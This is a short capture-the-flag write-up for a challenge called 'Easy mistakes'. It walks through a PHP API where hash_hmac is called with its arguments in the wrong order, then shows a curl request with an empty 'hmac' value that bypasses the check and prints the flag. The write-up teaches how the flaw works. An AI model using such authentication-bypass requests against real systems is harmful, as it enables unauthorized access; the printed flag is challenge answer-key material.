# Day 20 - Easy mistakes

When programming, it is easy to make simple mistakes, and some of them can have dire consequences.

## Write-Up
Browsing the link we get this output, which we can clean up a bit...

```
This is the code found in /api.php

<?php
    $data = json_decode(file_get_contents('php://input'), true);
    
    if(!isset($data['hmac']) || !isset($data['host'])) {
        header("HTTP/1.0 400 Bad Request");
        exit;
    }
    $secret = getenv("SECRET");
    $flag = getenv("FLAG");
    $hmac = hash_hmac($data["host"], $secret, "sha256");
    
    if ($hmac != $data['hmac']){
        header("HTTP/1.0 403 Forbidden");
        exit;
    }
    
    echo $flag;
```

Let's look closer at what this code does.

- First convert and store the input (JSON string).
   - Ref: https://www.php.net/manual/en/function.json-decode.php
- Check if keys "hmac" and "host" from the input are set
   - If not, then give 404 and exit
- Get value from environment variables; SECRET and FLAG.
   - Ref: https://www.php.net/manual/en/function.getenv.php
- Calculate HMAC Hash
   - Ref: https://www.php.net/manual/en/function.hash-hmac.php
- Check if HMAC Hash match Value read from request
   - If not, then give 403 and exit
- Print the flag... IF alle checks have passed...

All looks good, except one thing!
Looking at the docs for `hash_hmac`, we see that the correct order of parameters for this function is
```
hash_hmac( string $algo, string $data, string $key)
```

The programmer has definitely been in a hurry and not used the right order of the arguments.
This usage will return an empty string and store it in `$hmac`. As we can control the value of "hmac" we provide, we only need to privde an empty string. The "host" value just have to be set.

We create the following JSON:

```
{
    "hmac" : "",
    "host" : "do.not.care"
}
```

We could use `BURP proxy` and forge the requst that way, but lets use `cURL`

```shell
$ curl http://rsxc.no:20020/api.php -d '{ "hmac" : "", "host" : "do.not.care" }'
RSXC{You_have_to_have_the_right_order_for_arguments!}
```

## The Flag
RSXC{You_have_to_have_the_right_order_for_arguments!}